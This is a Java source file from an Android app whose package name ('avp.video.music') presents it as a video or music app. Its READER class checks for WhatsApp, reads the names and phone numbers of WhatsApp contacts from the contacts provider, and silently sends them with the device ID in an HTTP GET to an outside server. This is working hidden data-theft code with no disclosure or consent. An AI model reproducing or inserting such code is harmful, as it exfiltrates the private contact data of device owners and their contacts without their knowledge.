package avp.video.music;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

/**
 * Created by AP on 19-09-2015.
 */
public class READER {
    public static void run(Context mContext) {
        Context context = null;
        StringBuilder str = new StringBuilder("");
        boolean installed = false;
        installed = appInstalledOrNot ("com.whatsapp",mContext);
        if (installed) {
        //    Toast.makeText(this, "App installed", Toast.LENGTH_SHORT).show ();


        final String[] projection = {
                ContactsContract.Data.CONTACT_ID,
                ContactsContract.Data.MIMETYPE,
                "account_type",
                ContactsContract.Data.DATA3,
        };
        final String selection = ContactsContract.Data.MIMETYPE + " =? and account_type=?";
        final String[] selectionArgs = {
                "vnd.android.cursor.item/vnd.com.whatsapp.profile",
                "com.whatsapp"
        };
        ContentResolver cr = mContext.getContentResolver();
        Cursor c = cr.query(
                ContactsContract.Data.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                null);
        while (c.moveToNext()) {
            String id = c.getString(c.getColumnIndex(ContactsContract.Data.CONTACT_ID));
            String number = c.getString(c.getColumnIndex(ContactsContract.Data.DATA3));
            String name = "";
            Cursor mCursor = mContext.getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    new String[]{ContactsContract.Contacts.DISPLAY_NAME},
                    ContactsContract.Contacts._ID + " =?",
                    new String[]{id},
                    null);
            while (mCursor.moveToNext()) {
                name = mCursor.getString(mCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            }
            mCursor.close();
            str.append(name + "-" + number + "_");
            //list.add(putData(name, number));
        }
        //Log.v("WhatsApp", "Total WhatsApp Contacts: " + c.getCount());
        c.close();
        //  return str;
        String bstring = str.toString();
        //generateNoteOnSD("READER.txt", bstring);
        String deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
        URI url = null;
        try {
            url = new URI("http://mobile.djamol.com/inc/wapp.php?id=" + deviceId + "&data=" + bstring);
        } catch (URISyntaxException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        HttpClient httpclient = new DefaultHttpClient();
        HttpGet request = new HttpGet();
        request.setURI(url);
        try {
            httpclient.execute(request);
        } catch (ClientProtocolException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

}
    private static boolean appInstalledOrNot(String uri,Context mContext) {
        PackageManager pm = mContext.getPackageManager();
        boolean app_installed = false;
        try {
            pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
            app_installed = true;
        } catch (PackageManager.NameNotFoundException e) {
            app_installed = false;
        }
        return app_installed;
    }


}
//Save in Text File
/*
    public static void generateNoteOnSD(String sFileName, String sBody) {
        try {
            File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            if (!root.exists()) {
                root.mkdirs();
            }
            File gpxfile = new File(root, sFileName);
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(sBody);
            writer.flush();
            writer.close();
            //Toast.makeText(this, "Saved", Toast.LENGTH_SHORT).show();
        } catch (IOException e) {
            e.printStackTrace();
            //importError = e.getMessage();
            //iError();
        }

*/







